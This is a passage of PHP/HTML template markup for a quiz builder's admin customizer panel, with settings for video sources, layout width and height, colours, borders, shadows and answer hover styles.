													<label class="radio-btn--outer"><input type="radio" name="template9_question_screen_layout_option" value="full_width" checked>Full Width</label>
													<label class="radio-btn--outer"><input type="radio" name="template9_question_screen_layout_option" value="split_screen">Split Screen</label>
												</div>
												<div class="inner_options template9_split_screen_options sqb-radio-button-wrapper" style="display:none;">
													<label class="radio-btn--outer"><input type="radio" name="template9_question_screen_split_option" value="video_left" checked>Video Question Left</label>
													<label class="radio-btn--outer"><input type="radio" name="template9_question_screen_split_option" value="video_right">Video Question Right</label>
													<label class="radio-btn--outer"><input type="radio" name="template9_question_screen_split_option" value="image_left">Image on Left</label>
													<label class="radio-btn--outer"><input type="radio" name="template9_question_screen_split_option" value="image_right">Image on Right</label>
												</div>
											</div>
										</div>
									</div>
								</div>

								<div class="customizer_innner_sections video-settings-show-hide" style="display:none;">
									<div class="Template-Customize-element template9_customizer template9-video-options">
										<div class="Template-Customize-element-inner question_temp_width" style="display:block">
											<div class="inner_template_style_box image_opacity_btn" style="">
												<div class="template9-video-instruction">
													<label class="form-label">
														<div class="tool-tip tooltip-on-left">
															<a href="javascript:void(0);">Recommendations >>></a>
															<div class="toll-tip-desc">
																<ol>
																	<li>Use short videos (<25MB).</li>
																	<li>Long videos can buffer and affect performance.</li>
																	<li>Upload to Amazon S3 instead of your server for better performance. </li>
																	<li>If uploaded to s3, make the link "public" and enter the link here. </li>
																</ol>
															</div>
														</div>
													</label>
												</div>
												<div class="quiz-popup-feild">
												<label class="form-label">Select a Video Source:</label>
												<div class="quiz-popup-feild-right ">
													<select name="template9-video-dropdown" class="template9-video-dropdown template9-video-select-common">
														<option value="upload">Upload</option>
														<option value="link">Link</option>
													</select>

													
												</div>
											</div>

											<div class="quiz-popup-feild template9-link-option" style="display:none;">
												<div class="quiz-popup-feild-right">
													<div class="input-group">
														<input class="form-control question_video_option video-upload-input-field" type="text" name="video-upload-url" value="" placeholder="Enter URL">
													</div>
												</div>
											</div>
											<div class="question_screen_extension_error file_extension_error" style="display:none;">Video formats supported: .mp4, .mov & .webm. </div>

											<div class="quiz-popup-feild template9-upload-option">
												<div class="quiz-popup-feild-right">
													<div class="input-group multiple-btn-icon">
														<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_change_question_screen_video_template9 change-vide-btn">Upload Video</a>

														<a href="javascript:void(0)" class="sqb_delete_question_screen_video_template9 delete-vide-btn" title="Delete Video"><i class="fas fa-trash"></i></a>
													</div>
												</div>
												<div class="quiz-popup-feild-right show_video_url_outer question_screen_video_upload_url_outer" style="display: none;">
													<div class="show_video_url question_screen_video_upload_url"></div>
												</div>
											</div>

											<input type="hidden" name="question_screen_split_value" value="sqb-template-bg-video-left">
											<input type="hidden" name="question_screen_video_hidden" value="">
											<input type="hidden" name="question_screen_video_source_hidden" value="">
											<input type="hidden" name="question_screen_splash_image_hidden" value="">

											
											<div class="Template-Customize-element-inner">
												<div class="inner_template_style_box splash_image_option" style="display: none;">
													<h4><b>Splash Image</b></h4>
													<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_change_question_screen_splash_image_template9 splash_image_option_for_temp9">Upload Image</a>
													<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_remove_question_screen_splash_image_template9 mt-3 splash_image_option_for_temp9">Remove Image</a>
												</div>
											</div>

											
										</div>

										<div class="inner_template_style_box">
											<h4>Show Video Controls</h4>
											<div class="quiz_right-content">
				                                <div class="square-switch_onoff">
				                                    <input class="checkbox" name="focus_mode" type="checkbox" id="template9_video_controls_question" value="Y" checked="">
				                                    <label for="template9_video_controls_question"></label>
				                                </div>
				                            </div>
										</div>

										<div class="inner_template_style_box show_video_captions">
											<h4>Show Video Captions</h4>
											<div class="quiz_right-content">
				                                <div class="square-switch_onoff">
				                                    <input class="checkbox" name="video_captions" type="checkbox" id="template9_question_video_captions" value="N">
				                                    <label for="template9_question_video_captions"></label>
				                                </div>
				                                <a style="text-decoration: underline;display: none;" href="javascript:void(0)" class="template9_question_add_caption change-video-caption-btn">Add Captions</a>
				                            </div>
										</div>

										<div class="inner_template_style_box">
											<h4>Play Button Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="template9-play-button-background-color_div">
												<input type="text" value="#fff" id="template9-play-button-background-color" >
												<span class="input-group-addon">
													<i style="background-color: rgb(255, 255, 255);"></i>
												</span>
											</div>
										</div>

									</div>
								</div>
							</div>
							<div class="customizer_innner_sections">
								<div class="Template-Customize-element-inner template9_question_screen_image_option" style="display:none;">
									<div class="inner_template_style_box image_opacity_btn" style="">
										<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_change_question_screen_bg_image_template9">Change Image</a>
										<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_remove_question_screen_bg_image_template9 mt-3">Remove Image</a>
									</div>
								</div>
							</div>

							<div class="customizer_innner_sections">
								<div class="Template-Customize-element template9_customizer">
									<div class="Template-Customize-element-inner question_temp_width" style="display:block">
										<div class="inner_template_style_box">
										   	<h4>Background Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="template9-layout-background-color_div">
												<input type="text" value="rgb(214, 153, 92)" id="template9-layout-background-color" >
												<span class="input-group-addon">
													<i style="background-color: rgb(214, 153, 92);"></i>
												</span>
											</div>
										</div>	
									</div>
								</div>
							</div>
							<div class="customizer_innner_sections" style="display:none;">
								<div class="Template-Customize-element template9_customizer">
									<div class="Template-Customize-element-inner question_temp_width" style="display:block">
										<div class="inner_template_style_box image_opacity_btn" style="">
											<h4>Inner Section Width</h4>
											<div class="template9-inner-width-px">
												<div class="d-flex align-items-center">
													<p>
														<input id="template9_question_temp_inner_section_width_px" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="380" data-slider-max="2000" data-slider-step="1" data-slider-value="700">
													</p>
													<div class="slider-user-value">
														<input type="text" class="template9-inner-width-value" name="template9-iiner-width-value" value="500">
														<select class="select-template9-inner-width" name="select-background-height_v2">
															<option value="px">px</option>
															<option value="percent">%</option>
														</select>
													</div>
												</div>
											</div>
											<div class="template9-inner-width-percent" style="display:none;">
												<div class="d-flex align-items-center">
													<p>
														<input id="template9_question_temp_inner_section_width_percent" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="100" data-slider-step="1" data-slider-value="50">
													</p>
													<div class="slider-user-value">
														<input type="text" class="template9-iiner-width-value" name="template9-iiner-width-value" value="500">
														<select class="select-template9-inner-width" name="select-background-height_v2">
															<option value="px">px</option>
															<option value="percent">%</option>
														</select>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>

							<div class="customizer_innner_sections" style="display:none;">
								<div class="Template-Customize-element template9_customizer">
									<div class="Template-Customize-element-inner question_temp_width" style="display:block">
										<div class="inner_template_style_box">
											 <h4>Inner Section Alignment</h4>
											<p>
												<select id="template9-inner-section-alignment-option" >
													<option value="left">Left</option>
													<option value="right">Right</option>
													<option value="center">Center</option>
												</select> 
											</p>
									 	</div>
									</div>
								</div>
							</div>
						</div>
						<div class="sqbv2-template1 Template-Customize-Setting Template-Customizer-Section hide_for_template6" style="<?php echo $show_question_settings; ?>">
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Template Customizer  
									<div class="customize_open_close">   
										<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
									</div>
								</h3> 
							</div>

							<div class="customizer_innner_sections">
								
								<div class="Template-Customize-element show_for_template8 hide_for_global_theme_enabled">
									<div class="Template-Customize-element-inner temp8_width" style="display: block;">
										<div class="inner_template_style_box">
											<h4>Width</h4>
											<div class="d-flex align-items-center">
												<p>
													<input class="slider template8_question_temp_width" data-slider-id="ex1Slider" type="text" data-slider-min="370" data-slider-max="2000" data-slider-step="1" data-slider-value="<?php echo (int) $template8_background_width; ?>">
												</p>
												<div class="slider-user-value">
													<input type="text" class="template8_question_temp_width_input" name="template8_question_temp_width_input" value="<?php echo (int) $template8_background_width; ?>">
													<p class="px-value">px</p>
												</div>
											</div>
										</div>
									</div>
								</div>
								
								<!-- <div class="Template-Customize-element show_for_template8">
									<div class="Template-Customize-element-inner question_temp_width" style="display:block">
										<div class="inner_template_style_box">
											<h4>Inner Width</h4>
											<p>
												<input id="question_temp_inner_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="380" data-slider-max="2000" data-slider-step="1" data-slider-value="700">
											</p>
										</div>
									</div>
								</div> -->

								<div class="inner_template_style_box image_opacity_btn height-px-vh-v2 hide_for_global_theme_enabled1 hide_for_template6 hide_for_template7 hide_for_template8 hide_for_template9" style="">
									<h4>Height</h4>
									<?php 
									$selected_height_px = '';
									$selected_height_per = '';
									$show_height_px_div = 'display:none';
									$show_height_per_div = 'display:none';
										
									if($background_height_unit_v2 == 'vh'){
										$selected_height_per = 'selected="selected"';
										$show_height_per_div = 'display:block';
									}else{
										$selected_height_px = 'selected="selected"';
										$show_height_px_div = 'display:block';
									} ?>

									

									<div class="background-height-vh_v2" style="<?php echo $show_height_per_div?>">
										<div class="d-flex align-items-center">
											<p>
												<input id="" class="slider background_height_vh_question_v2" data-slider-id="ex1Slider" type="text" data-slider-min="1" data-slider-max="100" data-slider-step="1" data-slider-value="<?php if($background_height_v2){echo $background_height_v2;}else{
													echo '50';
												} ?>">
											</p>
											<div class="slider-user-value">
												<input type="text" name="select_background_height_vh_v2" value="<?php if($background_height_v2){echo $background_height_v2;}else{
													echo '50';
												} ?>">
												<select class="select-background-height_v2" name="select-background-height_v2">
													<option value="px" <?php echo $selected_height_px; ?>>px</option>
													<option value="vh" <?php echo $selected_height_per; ?>>vh</option>
												</select>
											</div>
										</div>
									</div>
								</div>

								<div class="Template-Customize-element show_for_template8 hide_for_global_theme_enabled">
									<div class="Template-Customize-element-inner temp8_height" style="display: block;">
										<div class="inner_template_style_box">
											<h4>Padding</h4>
											<p>
												<input class="slider template8_question_temp_height" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="500" data-slider-step="1" data-slider-value="<?php echo (int) $template8_background_height; ?>">
											</p>
										</div>
									</div>
								</div>
								
								<div class="Template-Customize-element show_for_template8 hide_for_global_theme_enabled">
									<div class="Template-Customize-element-inner temp8_bgcolor" <?php echo $template8_image_enabled; ?>>
										<div class="inner_template_style_box">
											<h4>background-color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element temp8_backgroud_color_div">
												<input type="text" value="<?php echo $template8_background_color; ?>" class="temp8_backgroud_color" >
												<span class="input-group-addon"><i style="background-color: <?php echo $template8_background_color; ?>;"></i></span>
											</div>
										</div>
									</div>
								</div>
								
								 
								<div class="Template-Customize-element show_for_template8 hide_for_global_theme_enabled">
									<div class="Template-Customize-element-inner template_img_style" style="display: block;">
										 		
										<div class="inner_template_style_box image_opacity_btn" style="">
											<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_change_start_screen_bg_image_template6">Change Image</a>
											<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_remove_bg_image_template6 mt-3">Remove Image</a>
										</div>
									</div>
								</div>

								<div class="Template-Customize-element show_for_template8 hide_for_global_theme_enabled" style="display:none;">
									 
									<div class="Template-Customize-element-inner" style="display: none;">
										 		
										<div class="inner_template_style_box ">
											<h4>Background Image Opacity</h4>
											<p>
												<input class="slider template8_background_image_opacity_question" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="1" data-slider-step="0.1" data-slider-value="<?php echo $template8_bg_img_opacity; ?>">
											</p>
										</div>
									</div>
								</div>



								<div class="Template-Customize-element hide_for_template8 hide_for_global_theme_enabled">
									<button type="button" data-id="template_border_style" class="Template-Customize-element-btn"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Border style</button>
									<div class="Template-Customize-element-inner template_border_style" style="display:none">
										<div class="inner_template_style_box">
											<h4>Border-Width</h4>
											<p>
												<input id="question_temp_br_wid" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="1">
											</p>
										</div>
										<div class="inner_template_style_box">
											<h4>Border-Style</h4>
											<p>
												<select id="question_temp_br_style">
													<option value="solid" selected>Solid</option>
													<option value="dashed">Dashed</option>
													<option value="dotted">Dotted</option>
												</select>
											</p>
										</div>
										<div class="inner_template_style_box">
											<h4>Border-color</h4>
											<div id="question_temp_br_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
												<input type="text" value="#ddd" id="question_temp_br_clr">
												<span class="input-group-addon"><i style="background-color: rgb(231, 231, 231);"></i></span>
											</div>
										</div>
									</div>
								</div>

								<div class="Template-Customize-element hide_for_template8 hide-for-template1to4">
									<button type="button" data-id="question_temp_shadow"  class="Template-Customize-element-btn"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Shadow</button>
									<div class="Template-Customize-element-inner question_temp_shadow" style="display:none">
										 
										 <div class="inner_template_style_box">
											<h4>Spread  Radius</h4>
											<p>
												<input id="question_temp_spread_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
											</p>
										</div>
										 
										 <div class="inner_template_style_box">
											<h4>Blur Radius</h4>
											<p>
												<input id="question_temp_blur_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
											</p>
										</div>
										
										<div class="inner_template_style_box">
											<h4>Horizontal Length</h4>
											<p>
												<input id="question_temp_hor_lnth" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
											</p>
										</div>
										
										<div class="inner_template_style_box">
											<h4>Vertical Length</h4>
											<p>
												<input id="question_temp_ver_lnth" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
											</p>
										</div>
										 <div class="inner_template_style_box">
											   <h4>Background Color</h4>
												<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_temp_shad_clr_div">
													<input type="text" value="#fff" id="question_temp_shad_clr" >
													<span class="input-group-addon">
														<i style="background-color: rgb(255, 255, 255);">
														</i>
													</span>
												</div>
										</div>
									</div>
								</div>
								<div class="Template-Customize-element Template5_customizer hide_for_global_theme_enabled1">	
									<div class="Template-Customize-element-inner question_temp_section_color" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Height</h4>
											<p>
												<input id="question_temp_height" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="480" data-slider-max="1500" data-slider-step="1" data-slider-value="760">
											</p>
										</div>
									</div>
								</div>
								<div class="Template-Customize-element Template5_customizer">
									<div class="Template-Customize-element-inner question_temp_section_color" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Left Section Background Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_temp_left_sction_clr_div">
												<input type="text" value="#efd9ca" id="question_temp_left_sction_clr" >
												<span class="input-group-addon">
													<i style="background-color: #efd9ca;">
													</i>
												</span>
											</div>
										</div>
									</div>
								</div>	
								
								<div class="Template-Customize-element Template5_customizer">	
									<div class="Template-Customize-element-inner question_temp_section_color" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Right Section Background Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_temp_right_sction_clr_div">
												<input type="text" value="#141c3a" id="question_temp_right_sction_clr" >
												<span class="input-group-addon">
													<i style="background-color: #141c3a">
													</i>
												</span>
											</div>
										</div>
									</div>
								</div>
								<div class="Template-Customize-element Template5_customizer" style="display: none;">	
									<div class="Template-Customize-element-inner question_temp_section_color" style="display: block;">
										 <div class="inner_template_style_box">
											<h4>Progress Bar Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_progress_bar_clr_div">
												<input type="text" value="#000000" id="question_progress_bar_clr" >
												<span class="input-group-addon">
													<i style="background-color: #000000">
													</i>
												</span>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>

						<?php 
						if(isset($quiz_data)){
							$template =  $quiz_data->getTemplate();
							if($quiz_type == 'poll' && $template == "template8"){
								$show_template_customizer = 'display:none';
							}else if(($quiz_type == 'poll' && $template == "template1") || ($quiz_type == 'poll' && $template == "template2") || ($quiz_type == 'poll' && $template == "template3") || ($quiz_type == 'poll' && $template == "template4")){
								$show_template_customizer = 'display:block';
							}else if($template == "template6" || $template == "template9"){
								$show_template_customizer = 'display:block';
							}else{
								$show_template_customizer = 'display:none';
							}
						}
						?>

						<div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer outcome-screen-background-customizer hide_for_global_theme_enabled" style="<?php echo $showtemplate6option; ?>">
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Main Section
									<div class="customize_open_close">   
										<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
									</div>
								</h3> 
							</div>

							<div class="customizer_innner_sections" style="display:none;">
								 <div class="Template-Customize-element">
									<div class="Template-Customize-element-inner element_paddings">

				                        <!-- Focus Mode Start -->

				                        <div class="inner_template_style_box image_opacity_btn">
				                            <h4>Focus Mode</h4>
				                            <div class="quiz_right-content">
				                                <div class="square-switch_onoff">
				                                    <input class="checkbox" name="focus_mode" type="checkbox" id="focus_mode_question" value="Y" <?php if($template6_focus_mode == 'Y'){ echo 'checked'; }else{ echo ''; } ?>>
				                                    <label for="focus_mode_question"></label>
				                                </div>
				                            </div>
				                        </div>  

				                        <!-- Focus Mode End -->

							  			<div class="inner_template_style_box image_opacity_btn enable-disable-width" style="<?php if($template6_focus_mode == 'Y'){ echo 'display: none'; }else{ echo 'display: block'; } ?>">
											<h4>Width</h4>

											<?php 
											$selected_px = '';
											$selected_per = '';
											$show_px_div = 'display:none';
											$show_per_div = 'display:none';

											if($width_sign == '%'){
												$selected_per = 'selected="selected"';
												$show_per_div = 'display:block';
											}else{
												$selected_px = 'selected="selected"';
												$show_px_div = 'display:block';
											} ?>


											<div class="width-show-in-px" style="<?php echo $show_px_div ?>">
												<div class="d-flex align-items-center">
												<p>
													<input id="background_width_question" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="370" data-slider-max="2000" data-slider-step="1" data-slider-value="<?php if($background_width){echo $background_width;}else{
														echo '2000';
													} ?>">
												</p>
												<div class="slider-user-value">
													<input type="text" name="select_background_width" value="<?php if($background_width){echo $background_width;}else{
														echo '2000';
													} ?>">

													<select class="select-background-width-option" name="select-background-width-option">
														<option value="px" <?php echo $selected_px ?>>px</option>
														<option value="percentage" <?php echo $selected_per ?>>%</option></select>
												</div>
												</div>
											</div>
											<div class="width-show-in-percentage" style="<?php echo $show_per_div; ?>">
												<div class="d-flex align-items-center">
												<p>
													<input id="background_width_percentage_question" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="1" data-slider-max="100" data-slider-step="1" data-slider-value="<?php if($background_width){echo $background_width;}else{
														echo '100';
													} ?>">
												</p>
												<div class="slider-user-value">
													<input type="text" name="background_width_percentage" value="<?php if($background_width){echo $background_width;}else{
														echo '100';
													} ?>">
													<select class="select-background-width-option" name="select-background-width-option">
														<option value="px" <?php echo $selected_px ?>>px</option>
														<option value="percentage" <?php echo $selected_per ?>>%</option>
													</select>
												</div>
												</div>
											</div>
										</div>	
										<div class="inner_template_style_box image_opacity_btn" style="">
											<h4>Height</h4>

											<?php 
											$selected_height_px = '';
											$selected_height_per = '';
											$show_height_px_div = 'display:none';
											$show_height_per_div = 'display:none';
												
											if($height_sign == 'vh'){
												$selected_height_per = 'selected="selected"';
												$show_height_per_div = 'display:block';
											}else{
												$selected_height_px = 'selected="selected"';
												$show_height_px_div = 'display:block';
											} ?>


											<div class="background-height-px" style="<?php echo $show_height_px_div?>">
												<div class="d-flex align-items-center">
													<p>
														<input id="background_height_question" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="1000" data-slider-step="1" data-slider-value="<?php if($background_height){echo $background_height;}else{
															echo '10';
														} ?>">
													</p>
													<div class="slider-user-value">
														<input type="text" name="select_background_height" value="<?php if($background_height){echo $background_height;}else{
															echo '10';
														} ?>">
														<select class="select-background-height" name="select-background-height">
															<option value="px" <?php echo $selected_height_px; ?>>px</option>
															<option value="vh" <?php echo $selected_height_per; ?>>vh</option>
														</select>
													</div>
												</div>
											</div>

											

											

											<div class="background-height-vh" style="<?php echo $show_height_per_div?>">
												<div class="d-flex align-items-center">
													<p>
														<input id="background_height_vh_question" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="1" data-slider-max="100" data-slider-step="1" data-slider-value="<?php if($background_height){echo $background_height;}else{
															echo '100';
														} ?>">
													</p>
													<div class="slider-user-value">
														<input type="text" name="select_background_height_vh" value="<?php if($background_height){echo $background_height;}else{
															echo '100';
														} ?>">
														<select class="select-background-height" name="select-background-height">
															<option value="px" <?php echo $selected_height_px; ?>>px</option>
															<option value="vh" <?php echo $selected_height_per; ?>>vh</option>
														</select>
													</div>
												</div>
											</div>
										</div>
										 
										 <div class="Template-Customize-element warapper_padding_option_v2">
											<div class="Template-Customize-element-inner inner_padding_option_v2" style="display: block;">
												<div class="inner_template_style_box">
													<h4>Padding</h4>
													<p>
														<input class="slider input_padding_option_v2" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="500" data-slider-step="1" data-slider-value="<?php echo (int) $template6_background_padding; ?>">
													</p>
												</div>
											</div>
										</div>
										<div class="inner_template_style_box image_opacity_btn" style="">
											<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_change_start_screen_bg_image_template6">Change Image</a>
											<a style="text-decoration: underline;" href="javascript:void(0)" class="sqb_remove_bg_image_template6 mt-3">Remove Image</a>
										</div>
										
										<div class="inner_template_style_box mt-4 template6-background-color-outer" style="<?php echo $template6_background_color; ?>">
											<h4>Background Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="start_temp_outer_backgroud_color_question_div">
												<input type="text" value="fff7f0" id="start_temp_outer_backgroud_color_question" >
												<span class="input-group-addon">
													<i style="background-color: #fff7f0;">
													</i>
												</span>
											</div>
										</div>
										<div class="inner_template_style_box mt-4">
				                            <h4>Background image opacity</h4>
				                                <input class="slider template6_background_image_opacity" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="1" data-slider-step="0.1" data-slider-value="<?php echo $template6_background_image_opacity; ?>">
				                        </div>
									</div>	
								</div>
							</div>
						</div>

						<div class="sqbv2-template6-question-screen Template-Customize-Setting element_customizer_wrapper_list btn_customizer outcome-screen-background-customizer hide_for_global_theme_enabled1" style="<?php echo $showtemplate6option; ?>">
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Inside Section 
									<div class="customize_open_close">   
										<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
									</div>
								</h3> 
							</div>

							<div class="customizer_innner_sections " style="display:none;">
								 <div class="Template-Customize-element">
									<div class="Template-Customize-element-inner element_paddings">
										
										
										<div class="inner_template_style_box hide_for_global_theme_enabled">
										    <h4>Background Color</h4>
											<div class="input-group colorpicker-component input-append color colorpicker-element" id="start_temp_backgroud_color_question_div">
												<input type="text" value="#fff" id="start_temp_backgroud_color_question" >
												<span class="input-group-addon">
													<i style="background-color: rgb(255, 255, 255);">
													</i>
												</span>
											</div>
										</div>

										<div class="inner_template_style_box template-background-opacity hide_for_global_theme_enabled" style="">
											<h4>Background opacity</h4>
											<p>
												<input id="background_opacity_question" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0.0" data-slider-max="1" data-slider-step="0.1" data-slider-value="1">
											</p>
											<div class="d-flex justify-content-between align-items-start">
												<span style="font-size: 12px;font-weight: 400;">Fully Transparent</span>
												<span style="font-size: 12px;font-weight: 400;">Not Transparent</span>
											</div>
										</div>
										<div class="inner_template_style_box custom_remove_border hide_for_global_theme_enabled">
										<span class="checkbox-custom-style">
											<input type="checkbox" name="remove_border" value="remove_border" class="custom-checkbox-input remove-border">
											<span class="custom--checkbox"></span>
										</span><span>Remove Border</span>
									</div>
									</div>	
								</div>
							</div>
						</div>	
						<div class="Template-Customize-Setting Template-Customizer-Section answer-template6-customizer template9-customizer-options hide_global_for_template6 hide_for_template9" style="<?php echo $show_template_customizer; ?>">
							<div class="showHideLeftSidebaroptions">
								<h3 class="Template-Customize_heading" >Answer Background 
									<div class="customize_open_close">
										<i class="fa fa-angle-up customize_close" aria-hidden="true"></i>
										<i class="fa fa-angle-down customize_open" aria-hidden="true" style="display:none"></i>
									</div>
								</h3> 
							</div>

							<div class="customizer_innner_sections" style="display:none;">
								<div class="Template-Customize-element">
									<div class="Template-Customize-element-inner template_img_style1">
										<div class="inner_template_style_box">
										   	<h4>Answer Background</h4>
											<div id="ques_temp_ans_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="#fff" id="ques_temp_ans_color">
												<span class="input-group-addon"><i style="background-color:#fff;"></i></span>
											</div>
										</div>

										<div class="inner_template_style_box">
											<h4>Answer Opacity</h4>
											<div class="d-flex align-items-center mt-2 background-opacity">
												<p>
													<input id="answer_background" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0.01" data-slider-max="1" data-slider-step="0.01" data-slider-value="0.85">
												</p>
												<div class="slider-user-value">
													<input type="text" name="select_answer_background" value="0.85">
												</div>
											</div>
										</div>

										<div class="inner_template_style_box">
										   	<h4>Answer Text Color</h4>
											<div id="ques_temp_ans_color_text" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="#000000" id="ques_temp_ans_text_color">
												<span class="input-group-addon"><i style="background-color:#000000;"></i></span>
											</div>
										</div>

										<?php 
										$ans_hover_opacity='';
										$ans_hover_color='';
										$ans_hover_text_color='';

										if(isset($quiz_data)){
										$template =  $quiz_data->getTemplate();
										if($template == "template6" || $quiz_type == 'poll'){
											if($quiz_data->getTransparentBackgroundSettings() != ''){
												$get_settings = $quiz_data->getTransparentBackgroundSettings();
												$get_details = explode("|",$get_settings);
												$width_sign = !empty($get_details[0]) ? $get_details[0] : '';
												$background_width = !empty($get_details[1]) ? $get_details[1] : '';
												$height_sign = !empty($get_details[2]) ? $get_details[2] : '';
												$background_height = !empty($get_details[3]) ? $get_details[3] : '';
												$settings_image = !empty($get_details[4]) ? $get_details[4] : '';
												$min_height = !empty($get_details[5]) ? $get_details[5] : '';
												$ans_hover_color = !empty($get_details[6]) ? $get_details[6] : '';
												$ans_hover_opacity = !empty($get_details[7]) ? $get_details[7] : '';
												$ans_hover_text_color = !empty($get_details[13]) ? $get_details[13] : '';
											}
										}else if($template == "template9"){
											$ans_hover_color = $temp9_answer_hover_color;
											$ans_hover_text_color = $temp9_answer_hover_text_color;
											$ans_hover_opacity = $temp9_answer_hover_opacity;

										}
									}
										 ?>

										<div class="inner_template_style_box">
										   	<h4>Answer Background Hover </h4>
											<div id="ques_temp_ans_hover_color" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="<?php if($ans_hover_color != ''){echo $ans_hover_color;}else{ echo '#ffda5c';} ?>" id="ques_temp_ans_hover_color_select">
												<span class="input-group-addon"><i style="background-color:#ffda5c;"></i></span>
											</div>
										</div>
										<div class="inner_template_style_box">
										   	<h4>Answer Text Hover Color</h4>
											<div id="ques_temp_ans_hover_text_color" class="input-append color input-group colorpicker-component colorpicker-element">
												<input type="text" value="<?php if($ans_hover_text_color != ''){echo $ans_hover_text_color;}else{ echo '#FFFFFF';} ?>" id="ques_temp_ans_hover_text_color_select">
												<span class="input-group-addon"><i style="background-color:#FFFFFF;"></i></span>
											</div>
										</div>

										<div class="inner_template_style_box">
											<h4>Answer Hover Opacity</h4>
											<div class="d-flex align-items-center mt-2 background-hover-opacity">
												<p>
													<input id="answer_hover_background" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0.01" data-slider-max="1" data-slider-step="0.01" data-slider-value="<?php if($ans_hover_opacity != ''){ echo $ans_hover_opacity;}else{echo '1';} ?>">
												</p>

												<div class="slider-user-value">
													<input type="text" name="answer_hover_background" value="<?php if($ans_hover_opacity != ''){ echo $ans_hover_opacity;}else{echo '1';} ?>">
													
												</div>
											</div>
										</div>

				                        <div class="inner_template_style_box">
				                            <h4>Answer Border Color</h4>
				                            <div id="template6_answer_border_color" class="input-append color input-group colorpicker-component colorpicker-element">
				                                <input type="text" value="<?php if($template6_answer_border_color != ''){echo $template6_answer_border_color;}else{ echo '#FFFFFF';} ?>" id="template6_answer_border_color_select">
				                                <span class="input-group-addon"><i style="background-color:#FFFFFF;"></i></span>
				                            </div>
				                        </div>
				                         <div class="inner_template_style_box">
				                            <h4>Answer Border Hover Color</h4>
				                            <div id="template6_answer_border_hover_color" class="input-append color input-group colorpicker-component colorpicker-element">
				                                <input type="text" value="<?php if($template6_answer_border_hover_color != ''){echo $template6_answer_border_hover_color;}else{ echo '#FFFFFF';} ?>" id="template6_answer_border_hover_color_select">
				                                <span class="input-group-addon"><i style="background-color:#FFFFFF;"></i></span>
				                            </div>
				                        </div>

				                        <div class="inner_template_style_box">
				                            <h4>Answer Border Width</h4>
				                            <div class="d-flex align-items-center mt-2">
				                                <p>
				                                    <input id="template6_answer_border_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="5" data-slider-step="1" data-slider-value="<?php if($template6_answer_border_width != ''){ echo $template6_answer_border_width;}else{echo '1';} ?>">
				                                </p>

				                                <div class="slider-user-value">
				                                    <input type="text" name="template6_answer_border_width" value="<?php if($template6_answer_border_width != ''){ echo $template6_answer_border_width;}else{echo '1';} ?>">
				                                    
				                                </div>
				                            </div>
				                        </div>

									</div>
								</div>
							</div>
						</div>
						<div class="Template-Customize-Setting template8-Answer-Customizer-Section" style="display:none;">
